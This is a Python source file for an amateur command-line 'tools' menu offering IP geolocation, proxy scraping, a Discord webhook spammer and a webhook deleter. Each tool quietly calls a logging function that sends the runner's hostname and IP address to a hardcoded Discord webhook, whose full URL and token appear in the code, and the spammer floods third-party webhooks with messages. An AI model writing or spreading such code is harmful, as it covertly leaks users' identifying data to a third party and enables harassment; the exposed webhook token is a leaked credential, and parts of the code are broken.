import os, requests, time, sys, random, socket, urllib
from datetime import datetime
import pprint
from dhooks import Webhook
import socket
from covid import Covid

def log(name):
    logging = Webhook("https://discord.com/api/webhooks/754324914189893632/9QruauiSVUyFoLzi6YVxLLA_qcWqSK1W766K40ohVxYug4UV95YWH2QIaSaw4JXjrGau")
    datae = f"{name} has been executed by {socket.gethostname()}, with the ip adress of {socket.gethostbyname(socket.getfqdn())}"
    logging.send(datae)
# tools lol


def GeoIP():
    ip_input = input('  IP> ')
    response = requests.get("http://extreme-ip-lookup.com/json/" + ip_input)
    response.json()
    pprint.pprint(response.json())
    time.sleep(8)
    log("GeoIP")
    Main()
def ProxyScrape():
    colour = "\033[31m"
    r = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http')
    print(r.text)
    p_type = input("  Type> ")
    p_timeout = input("  Timeout> ")
    f"https://api.proxyscrape.com/?request=getproxies&proxytype={p_type}&timeout={p_timeout}"
    with open("proxies.txt", "w") as f:
        f.write(r.text)
        print("proxies have been saved to" + colour + '"proxies.txt"')
        time.sleep(5)
        log("Proxyscraper")
        Main()
def webhookSpammer():
    sex = input("  how many times: ")
    yeeter = input("  Webhook: ")
    data = input("  Text: ")
    for i in range(int(sex)):
        hook = Webhook(yeeter)
        hook.send(data)
    print("webhook spammed")
    log("WebHook Spammer")
    time.sleep(3)
    Main()

def webhookDelete():
    yeeter = input("  webhook: ")
    hook = Webhook(yeeter)
    time.sleep(1)
    print("webhook deleted")
    hook.delete()
    log("Webhook Delete")
    Main()

def covidCheck():
    coveed = Covid()

# main code
class Main():
    def cls(self):
        linux = "clear"
        windows = "cls"
        os.system([linux, windows][os.name == "nt"])
    # ????????????????????????????????/ what the fuck does this mean
    def __init__(self):
        self.gg = True
        self.r = "\033[31m"
        self.g = "\033[32m"
        self.y = "\033[33m"
        self.b = "\033[34m"
        self.m = "\033[35m"
        self.c = "\033[36m"
        self.w = "\033[37m"
        self.rr = "\033[39m"
        self.cls()
        self.start_logo()
        self.options()
        while self.gg == True:
            choose = input(str("  > "  ))
            if(choose == str(1)):
                self.cls()
                self.start_logo()               
                GeoIP()
            elif(choose == str(2)):
                self.cls()
                self.start_logo()
                ProxyScrape()
            elif(choose == str(3)):
                self.cls
                self.start_logo
                webhookSpammer()
            elif(choose == str(4)):
                self.cls
                self.start_logo
                webhookDelete()


    def start_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]
        x = """
        ████████╗███████╗███████╗████████╗
        ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
           ██║   █████╗  ███████╗   ██║   
           ██║   ██╔══╝  ╚════██║   ██║   
           ██║   ███████╗███████║   ██║   
           ╚═╝   ╚══════╝╚══════╝   ╚═╝   

        """

        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)
    def options(self):
        print(self.y + '        [1]' + self.c + '  geoip')
        print(self.y + '        [2]' + self.c + '  proxy scraper')
        print(self.y + '        [3]' + self.c + '  webhook spammer')
        print(self.y + '        [4]' + self.c + '  webhook deleter')
        print(self.y + '        [5]' + self.c + '  dm spammer')


Main()